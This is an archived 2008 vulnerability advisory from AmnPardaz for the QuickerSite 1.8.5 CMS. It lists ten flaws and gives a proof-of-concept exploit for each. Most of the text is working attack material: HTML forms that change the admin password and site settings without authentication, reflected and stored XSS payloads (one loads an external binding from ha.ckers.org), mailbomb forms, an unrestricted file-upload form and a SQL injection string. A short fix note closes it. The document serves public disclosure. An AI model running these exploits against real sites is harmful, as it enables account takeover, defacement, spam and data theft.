@@ -1,0 +1,184 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: QuickerSite Multiple Vulnerabilities
+# Vendor: www.quickersite.com
+# Vulnerable Version: 1.8.5
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: http://bugreport.ir/index.php?/39
+###################################################################################
+
+####################
+1. Description:
+####################
+    QuickerSite is a Content Management System for Windows Servers. It is written in ASP/VBScript with an optional pinch of ASP.NET for true image-resizing capabilities. QuickerSite ships with an Access database, with the option to upsize to SQL Server 2000/2005 for busy sites (>1000 visitors/day).
+####################
+2. Vulnerabilities:
+####################
+    2.1. Insecure Direct Object Reference [in "bs_login.asp"]. Everyone can change admin password.
+        2.1.1. Exploit:
+                Check the exploit section.
+    2.2. Insecure Direct Object Reference [in "bs_login.asp"]. Everyone can edit all the site info., such as admin email address.
+        2.2.1. Exploit:
+                Check the exploit section.
+    2.3. Insecure Direct Object Reference [in "bs_login.asp"]. Everyone can edit all the site design. (Also, all the site settings can be changed by other parameters)
+        2.3.1. Exploit:
+                Check the exploit section.
+    2.4. Failure to Restrict URL Access [in "mailPage.asp"]. Everyone can mailbomb others.
+        2.4.1. Exploit:
+                Check the exploit section.
+    2.5. Cross Site Scripting (XSS) [in "showThumb.aspx"]. Reflected XSS attack by circumventing the ASP.Net XSS denier (Path disclosure on the open error mode).
+        2.5.1. Exploit:
+                Check the exploit section.
+    2.6. Cross Site Scripting (XSS), Failure to Restrict URL Access [in "process_send.asp"]. Redirect Reflected XSS Attack In "SB_redirect" parameter. Reflected XSS, Content Spoofing In "SB_feedback" parameter. Everyone can mailbomb others.
+        2.6.1. Exploit:
+                Check the exploit section.
+    2.7. Cross Site Scripting (XSS) [in "picker.asp"]. Reflected XSS attack in "paramCode" and "cColor" parameters.
+        2.7.1. Exploit:
+                Check the exploit section.
+    2.8. Cross Site Scripting (XSS) [in "rss.asp"]. Stored XSS attack in "X-FORWARDED-FOR","QueryString","Referer"" header parameter. Attacker can execute an XSS against Admin.
+        2.8.1. Exploit:
+                Check the exploit section.
+    2.9. File uploading is allowed by FCKEDITOR.
+        2.9.1. Exploit:
+                Check the exploit section.
+    2.10. Injection Flaws [in "/asp/includes/contact.asp"]. SQL Injection on "check" function in "sNickName" parameter.
+        2.10.1. Exploit:
+                Check the exploit section.
+####################
+3. Exploits:
+####################
+
+    Original Exploit URL: http://bugreport.ir/index.php?/39/exploit
+    3.1. Everyone can change admin password.
+        -------------
+        <form action="http://[URL]/asp/bs_login.asp?btnAction=cSaveAdminPW" method="post">
+        adminPassword: <input type="text" name="adminPassword" value="" size="30" /><br />
+        adminPasswordConfirm: <input type="text" name="adminPasswordConfirm" value="" size="30" /><br />
+        <input type="submit" />
+        </form>
+        -------------
+    3.2. Everyone can edit all the site info., such as admin email address.
+        -------------
+        <form action="http://[URL]/asp/bs_login.asp?btnAction=saveAdmin" method="post">
+        Site Url: <input type="text" name="sUrl" value="http://www.VICTIM.com" size="100" /><br />
+        Site AlternateDomains: <input type="text" name="sAlternateDomains" value="http://www.VICTIM-Backup.com" size="100" /><br />
+        Description: <input type="text" name="sDescription" value="Hacked Description" size="100" /><br />
+        Site Name: <input type="text" name="siteName" value="Hacked Site Name" size="100" /><br />
+        Site Title: <input type="text" name="siteTitle" value="Hacked Site Title" size="100" /><br />
+        CopyRight: <input type="text" name="copyRight" value="Hacked CopyRight" size="100" /><br />
+        Keywords: <input type="text" name="keywords" value="Hacked KeyWords" size="100" /><br />
+        Google Analytics: <input type="text" name="googleAnalytics" value="Hacked Google Anal!" size="100" /><br />
+        Language: <input type="text" name="language" value="1" size="100" /><br />
+        DatumFormat: <input type="text" name="sDatumFormat" value="1" size="100" /><br />
+        Webmaster: <input type="text" name="webmaster" value="Hacker" size="100" /><br />
+        Webmaster Email: <input type="text" name="webmasterEmail" value="MyEmail-ResetPassword@Hacker.Com" size="100" /><br />
+        Default RSS Link: <input type="text" name="sDefaultRSSLink" value="http://www.VICTIM.com/RSS.asp" size="100" /><br />
+        <input type="submit" />
+        </form>
+        -------------
+    3.3. Everyone can edit all the site design.
+        -------------
+        <form action="http://[URL]/asp/bs_login.asp?btnAction=saveDesign" method="post">
+        siteWidth: <input type="text" name="siteWidth" value="800" size="30" /><br />
+        menuWidth: <input type="text" name="menuWidth" value="600" size="30" /><br />
+        bgColorSides: <input type="text" name="bgColorSides" value="" size="30" /><br />
+        bgImageLeft: <input type="text" name="bgImageLeft" value="" size="30" /><br />
+        bgImageRight: <input type="text" name="bgImageRight" value="" size="30" /><br />
+        mainBGColor: <input type="text" name="mainBGColor" value="" size="30" /><br />
+        mainBgImage: <input type="text" name="mainBgImage" value="" size="30" /><br />
+        scheidingsLijnColor: <input type="text" name="scheidingsLijnColor" value="" size="30" /><br />
+        scheidingsLijnWidth: <input type="text" name="scheidingsLijnWidth" value="100" size="30" /><br />
+        menuBGColor: <input type="text" name="menuBGColor" value="" size="30" /><br />
+        menuBGImage: <input type="text" name="menuBGImage" value="" size="30" /><br />
+        menuBorderColor: <input type="text" name="menuBorderColor" value="" size="30" /><br />
+        MenuHoverBGColor: <input type="text" name="MenuHoverBGColor" value="" size="30" /><br />
+        subMenuBorderColor: <input type="text" name="subMenuBorderColor" value="" size="30" /><br />
+        fontType: <input type="text" name="fontType" value="" size="30" /><br />
+        fontColor: <input type="text" name="fontColor" value="" size="30" /><br />
+        linkColor: <input type="text" name="linkColor" value="" size="30" /><br />
+        fontSize: <input type="text" name="fontSize" value="10" size="30" /><br />
+        fontWeight: <input type="text" name="fontWeight" value="10" size="30" /><br />
+        publicIconColor: <input type="text" name="publicIconColor" value="" size="30" /><br />
+        publicIconColorHover: <input type="text" name="publicIconColorHover" value="" size="30" /><br />
+        siteAlign: <input type="text" name="siteAlign" value="" size="30" /><br />
+        menuLocation: <input type="text" name="menuLocation" value="" size="30" /><br />
+        <input type="hidden" name="defaultTemplate" value="EEE" size="30" />
+        <input type="submit" />
+        </form>
+        -------------
+    3.4. Everyone can mailbomb others.
+        -------------
+        <form action="http://[URL]/mailPage.asp?iId=HILHG" method="post">
+        <input type="text" name="btnAction" value="sendPage" />
+        <input type="text" name="sEmail" value="" />
+        <input type="submit" />
+        </form>
+        -------------
+    3.5. Reflected XSS attack by circumventing the ASP.Net XSS denier (Path disclosure on the open error mode).
+        -------------
+        http://[URL]/showThumb.aspx?img=test.jpg&close='STYLE='IRSDL:expr/**/ession(alert("XSS"))   (IE)
+        http://[URL]/showThumb.aspx?img=test.jpg&close='STYLE='-moz-binding:url(%22http://ha.ckers.org/xssmoz.xml%23xss%22) (Mozilla)
+        http://[URL]/showThumb.aspx?img=test.jpg&close='STYLE='IRSDL:expr/**/ession(alert("XSS"));-moz-binding:url(%22http://ha.ckers.org/xssmoz.xml%23xss%22)   (IE+Mozilla)
+        http://[URL]/showThumb.aspx (Path disc.)
+        -------------
+    3.6. Redirect Reflected XSS Attack In "SB_redirect" parameter in "process_send.asp". Reflected XSS, Content Spoofing In "SB_feedback" parameter in "process_send.asp". Everyone can mailbomb others.
+        -------------
+        <form action="http://[URL]/default.asp?iId=HILHG&pageAction=send" method="post">
+        MailTo: <input type="text" name="SB_emailto" value="" size="100" /><br />
+        Subject: <input type="text" name="SB_subject" value="" size="100" /><br />
+        Messgae: <input type="text" name="Messgae" value="" size="100" /><br />
+        SB_feedback: <input type="text" name="SB_feedback" value="XSS" size="100" /><br />
+        SB_redirect: <input type="text" name="SB_redirect" value="XSS" size="100" /><br />
+        <input type="submit" />
+        </form>
+        -------------
+    3.7. Reflected XSS attack in "paramCode" and "cColor" parameters in "picker.asp"
+        -------------
+        http://[URL]/asp/colorpicker/picker.asp?paramCode=pickerPanel.value=''};alert('XSS')</script><script>
+        http://[URL]/asp/colorpicker/picker.asp?cColor=irsdl<script>alert('XSS')</script>
+        -------------
+    3.8. Stored XSS attack in "X-FORWARDED-FOR","QueryString","Referer"" header parameter. Attacker can execute an XSS against Admin.
+        -------------
+        Header must like this:
+
+        GET /rss.asp?iId=IHJEF&s="'><script>alert('XSS-QueryString!')</script> HTTP/1.1
+        Host: [URL]
+        User-Agent: Not
+        Referer: FooNotSite.com"'><script>alert('XSS-Referer!')</script>
+        X-FORWARDED-FOR: "'><script>alert('XSS-Proxy!')</script>
+        ACCEPT-LANGUAGE: test
+        Accept-Encoding: gzip,deflate
+        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+        Keep-Alive: 300
+        Proxy-Connection: keep-alive
+        -------------
+    3.9. File uploading is allowed by FCKEDITOR.
+        -------------
+        <form enctype="multipart/form-data" action="http://[URL]/fckeditor251/editor/filemanager/connectors/asp/upload.asp" method="post">
+        <input type="file" name="NewFile"><br>
+        <input type="submit" value="Send it to the Server">
+        </form>
+        -------------
+    3.10. SQL Injection on "check" function in "sNickName" parameter.
+        -------------
+        http://[URL]/default.asp?pageAction=profile
+        Change "Nickname" to "'or'1'='1" and "'or'1'='2" and see the results
+        -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized for 3.5, 3.6, 3.7, 3.8, 3.10, And use access control for others.
+    Note: First check the vendor and look for the patch.
+####################
+- Credit :
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-03]
